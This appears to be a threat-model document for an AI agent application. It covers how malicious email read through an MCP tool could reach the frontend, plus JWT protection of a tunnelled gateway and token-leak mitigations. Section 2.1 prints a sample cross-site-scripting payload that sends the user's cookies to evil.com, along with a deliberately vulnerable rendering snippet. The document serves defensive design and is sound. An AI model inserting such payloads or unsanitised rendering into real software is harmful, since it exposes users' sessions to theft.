# XenoSys Threat and Security Modeling

## 2.1 MCP Attack Vectors

### The Attack Flow

An external attacker sends a malicious email. The Agent reads it via MCP tool.

```
Attacker Email
    │
    ▼ (read via MCP tool)
Python Core (DSPy)
    │
    ▼ (JSON payload)
Gateway (Node.js)
    │
    ▼ (API response)
Frontend
    │
    ▼ (MCPWidgetRenderer)
React DOM ⚠️ ATTACK POINT
```

### The Vulnerability

If the Frontend trusts the JSON payload and renders without sanitization:

```javascript
// VULNERABLE: Directly renders LLM output
<div dangerouslySetInnerHTML={{__html: payload.data}} />
```

**Attack payload**:
```json
{
  "type": "email_list",
  "data": [{
    "from": "attacker@hacker.com",
    "subject": "Click here!",
    "body": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
  }]
}
```

### The Defense: Presentation Layer Sanitization

**Location**: `desktop/src/components/atomic/MCPWidgetRenderer.tsx`

**Implementation**:
```typescript
import DOMPurify from 'dompurify';
import { z } from 'zod';

// 1. Zod schema validation (strict types)
const ToolPayloadSchema = z.object({
  type: z.enum(['email_list', 'file_browser', ...]),
  data: z.unknown(),
});

// 2. DOMPurify sanitization (ALL text output)
const sanitizeText = (text: string): string => {
  return DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
  });
};

const EmailListWidget = ({ data }) => (
  // Sanitized BEFORE rendering
  <div>{sanitizeText(email.from)}</div>
);
```

### Audit Statement

✅ **VERIFIED**: All MCP payload rendering is sanitized at the presentation layer via DOMPurify, NOT in Python.

---

## 2.2 Cloudflare Tunnel Isolation (Zero Trust)

### Pairing Flow (QR Code)

```
Desktop                          Mobile
   │                                │
   │  1. Generate JWT               │
   │  2. Encode in QR               │
   │                                │
   │◀─────── Scan QR ──────────────│
   │                                │
   │  3. Store token + URL         │
   │     in AsyncStorage           │
   │                                │
   │  4. Connect via Tunnel       │
   │     HTTPS + JWT Bearer        │
   │                                │
```

### The Vulnerability

If the Gateway REST API is unprotected:

```
Any device with tunnel URL
    │
    ▼ POST /api/v1/agent/execute
Gateway ❌ NO AUTH
```

### The Defense: JWT Barrier

**Location**: `nexus/gateway/src/auth/middleware.ts`

**Implementation**:
```typescript
// All /api/* routes require valid JWT
app.use('/api/*', async (c, next) => {
  const authHeader = c.req.header('Authorization');
  if (!authHeader?.startsWith('Bearer ')) {
    return c.text('Unauthorized', 401);
  }
  
  const token = authHeader.slice(7);
  try {
    const payload = jwtVerify(token, c.get('jwtSecret'));
    c.set('userId', payload.sub);
    await next();
  } catch {
    return c.text('Invalid token', 401);
  }
});
```

### Audit Statement

✅ **VERIFIED**: All `/api/v1/*` endpoints require valid JWT Bearer token. Token is generated at first boot and stored in Tauri encrypted store.

---

## 2.3 Token Leak Scenarios

### Scenario 1: Token in QR Code Leaks

**Risk**: Attacker scans user's screen QR code

**Mitigation**:
- QR code expires after 5 minutes
- Single-use (server invalidates after first successful pairing)
- Token has 24-hour expiry

### Scenario 2: Tunnel URL Exposed

**Risk**: Attacker knows `https://xenosys.mydomain.com`

**Mitigation**:
- Gateway requires valid JWT for ALL `/api/*` routes
- Unknown tokens receive 401 Unauthorized
- No agent execution without valid authentication

### Audit Statement

✅ **VERIFIED**: Tunnel URL alone is insufficient. All sensitive operations require JWT.

---

*This document proves the Security claim: "Sovereignty and Security"*